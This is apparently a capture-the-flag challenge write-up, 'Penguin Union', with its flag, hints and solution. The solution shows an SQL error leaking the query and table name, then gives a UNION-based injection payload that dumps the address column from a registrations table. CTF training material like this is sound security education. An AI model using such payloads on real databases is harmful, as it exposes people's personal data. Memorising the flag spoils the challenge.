# Challenge

**Name:** Penguin Union

**Category:** Vulnerabilities

**Difficulty:** Hard

**Flag:** `UWA{tH4t5_s0Me_b3Z0s_lVl_vN1oN_bUsTin}`

---

## Description

Join the Penguin **UNION** today!

You can see real reasons why other penguins have joined that are stored *securely* on a **SQL database server**.

*Can you figure out a way to leak the **`address`** of the penguins that have registered to join the union?*

---

## Hint 1

You want to dump the column named `address` from the table that is storing the registration details.

---

## Hint 2

Try some characters and see if you get an error message. It will help you figure out what is happening and the name of the table where the flag is.

---

## Solution

First search by a whole bunch of characters including the `'` character. For an example `' this should break` would print the following error message.

```
An error occurred: (sqlite3.OperationalError) near "this": syntax error [SQL: SELECT name,reason FROM registrations WHERE name LIKE '%' this should break%' OR reason LIKE '%' this should break%';] (Background on this error at: https://sqlalche.me/e/20/e3q8)
```

This indicates that the name of the table is called `registrations` and our goal is to dump the `address` column from that table. It also indicates that the web application is vulnerable to SQL injection and a UNION based attack would be able to dump the flag.

```
' UNION SELECT 1,address FROM registrations;--
```